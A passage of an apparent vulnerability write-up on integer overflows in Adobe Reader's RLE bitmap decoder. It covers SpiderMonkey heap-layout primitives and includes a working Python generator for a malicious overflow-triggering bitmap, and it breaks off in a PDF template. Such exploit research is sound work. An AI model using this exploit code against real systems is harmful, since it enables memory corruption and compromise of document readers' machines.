CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// uncompressed data</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// read 1 byte data</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// low-order 4 bits</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// high-order 4 bits</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integer overflow can be triggered in two spots, one exists within the handling of compressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line"><span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>Another one exists within the handling of uncompressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><h2 id="0x05-Exploit"><a href="#0x05-Exploit" class="headerlink" title="0x05. Exploit"></a>0x05. Exploit</h2><h3 id="5-1-Overflow-Candidate"><a href="#5-1-Overflow-Candidate" class="headerlink" title="5.1 Overflow Candidate"></a>5.1 Overflow Candidate</h3><p>Three integer overflows were found within the function. Here weâ€™ll choose the one within the handling of RLE8 data. Itâ€™s more exploit friendly than the others.</p><p>In terms of RLE4 data decoding, the value of <code>xpos</code> will be divided by <code>2</code> when putting data into the scan line. The maximum offset value for the scan line is <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> , it means that we can only <strong>write forward</strong> and the address we are trying to write is probably out of our control.</p><p>For RLE8 data decoding, the offset value for the scan line is <code>xpos</code> itself, thus we can <strong>write backward</strong> and the distance can be controlled. In the following <code>if</code> statement, the maximum value of <code>(unsigned __int8)cmd</code> is <code>0xFF</code> . And to bypass the check, the minimum value of <code>xpos</code> is <code>0xFFFFFF01</code> which should be <code>-255</code> in <code>signed int</code> form. In other words, we can write backward as large as <code>0xFF</code> bytes.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>However, the interval weâ€™re trying to write can only be filled with the same value. This will cause some problems when writing exploit, it will be explained later.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure><h3 id="5-2-SpiderMonkey-Concepts"><a href="#5-2-SpiderMonkey-Concepts" class="headerlink" title="5.2 SpiderMonkey Concepts"></a>5.2 SpiderMonkey Concepts</h3><p>Adobe Reader uses <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> as its JavaScript engine. Before writing the exploit, letâ€™s learn some essential knowledge of the SpiderMonkey engine.</p><h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>When the value of <code>byteLength</code> is greater than <code>0x68</code> , the backing store of the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> object will be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it will be allocated from SpiderMonkeyâ€™s <strong>tenured heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// can be any value, default is 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// pointer of associated view object</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// can be any value, default is 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The names of the members in <code>ObjectElements</code> are meaningless for <code>ArrayBuffer</code> . Here the second member holds the <code>byteLength</code> value and the third member holds a pointer of the associated <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> object. The values of the other members are meaningless and can be any digits.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the backing store of the <code>ArrayBuffer</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>If we can change the value of the <code>byteLength</code> of <code>ArrayBuffer</code> , then we can achieve Out-Of-Bounds access. But be careful with the pointer of the associated <code>DataView</code> object, it can only be 0 or a valid <code>DataView</code> pointer, the process may crash immediately if we change it to some other values.</p><h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>When the value of <code>length</code> is greater than <code>14</code> , the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> object can be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it may be allocated from SpiderMonkeyâ€™s <strong>nursery heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the underlying storage buffer of the <code>Array</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure><p>The contents of both <code>array[0]</code> and <code>array[14]</code> are <code>41424344 ffffff81</code> , here the higher four bytes of data <code>0xFFFFFF81</code> indicates that the type of the element is <code>INT32</code> . And the contents of the elements within <code>[1, 13]</code> are all filled with <code>00000000 ffffff84</code> which means that theyâ€™re <code>undefined</code> .</p><p>If we can change the values of <code>capacity</code> and <code>length</code> , we can only achieve Out-Of-Bounds write, and the space after the original initialized elements and before the Out-Of-Bounds wrote elements will be filled with <code>00000000 ffffff84</code> . Thatâ€™s some kind of meaningless.</p><p>Itâ€™s not a good idea to change <code>initializedLength</code> to a large value. This may lead to crash when scanning the array elements during GC. Weâ€™ll probably encounter inaccessible memory page and crash the process.</p><h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>In SpiderMonkey, almost all JavaScript objects are inherited from <code>JSObject</code> , and the later class is inherited from <code>ObjectImpl</code> .</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure><p>For <code>DataView</code> object, the <code>elements</code> member will point to <code>emptyElementsHeader</code> which can be used to leak the base address of the JavaScript engine module.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure><h3 id="5-3-Bitmap-Construct"><a href="#5-3-Bitmap-Construct" class="headerlink" title="5.3 Bitmap Construct"></a>5.3 Bitmap Construct</h3><p>Following python code can be used to generate a RLE compressed bitmap image.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>Here weâ€™ll generate a RLE8 bitmap with the following parameters:</p><ul><li>width is <code>0xF0</code> </li><li>height is <code>1</code> </li><li>bit count is <code>8</code> </li></ul><p>Here the size of the heap buffer will be <code>0xF0</code> and we will be able to write <code>0xF4</code> bytes backward with value <code>0x10</code> .</p><h3 id="5-4-PDF-Construct"><a href="#5-4-PDF-Construct" class="headerlink" title="5.4 PDF Construct"></a>5.4 PDF Construct</h3><p>This section explains how to embed the generated BMP image into a PDF file. Following is the PDF template that will be used later.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            